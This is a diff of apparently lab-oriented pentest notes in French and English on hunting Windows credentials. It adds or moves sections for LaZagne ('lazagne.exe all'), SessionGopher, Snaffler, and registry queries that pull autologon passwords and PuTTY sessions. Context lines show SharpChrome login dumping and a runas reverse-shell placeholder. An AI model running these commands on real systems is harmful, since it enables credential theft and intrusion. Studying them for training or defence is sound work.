@@ -31,9 +31,41 @@ runas /savecred /user:inlanefreight\bob "COMMAND HERE | REVERSE SHELL etc"
 .\SharpChrome.exe logins /unprotect
 ```
 
+## Lazagne
+
+<https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe>
+
+```
+lazagne.exe all
+```
+
+### SessionGopher
+
+ [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
+
+```powershell
+Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Target SRV1 # si privilèges suffisants. Sinon, on peut chercher des infos pour son propre compte utilisateur ou tout ceux du poste (si admin)
+```
+
+### Autologon
+
+```shell
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "AutoAdmin Username Password"
+```
+
+### Putty
+
+```shell
+reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
+```
 ## Fichiers Intéressants
 
-### Recherche de fichiers
+## Recherche de fichier automatisée : Snaffler
+
+<https://github.com/SnaffCon/Snaffler/releases/download/1.0.132/Snaffler.exe>
+
+### Recherche de fichiers manuelle
 
 #### CMD
 
@@ -185,18 +217,6 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ## Email
 
 If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).
-
-## Recherche de fichier automatisée : Snaffler
-
-<https://github.com/SnaffCon/Snaffler/releases/download/1.0.132/Snaffler.exe>
-
-## Lazagne
-
-<https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe>
-
-```
-lazagne.exe all
-```
 
 ## Mots de passe dans les stratégies de groupe
 
